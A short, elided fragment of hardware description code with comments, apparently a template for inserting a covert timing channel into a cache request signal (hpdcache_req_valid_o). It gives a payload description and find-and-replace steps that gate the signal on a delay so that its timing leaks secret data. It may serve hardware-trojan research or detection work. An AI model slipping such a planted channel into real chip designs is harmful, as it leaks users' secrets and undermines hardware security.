 ...
 * Payload: Modulate timing of hpdcache_req_valid_o based on secret data
 * 
...
assign secret_bit = hpdcache_req_valid_o[0];
...
// ============================================================
// Covert Channel: Modulate timing of hpdcache_req_valid_o
//
// Integration Script Must Modify:
//
// IF hpdcache_req_valid_o is timing-sensitive:
//   Find: assign hpdcache_req_valid_o = ready_signal;
//   Replace: assign hpdcache_req_valid_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
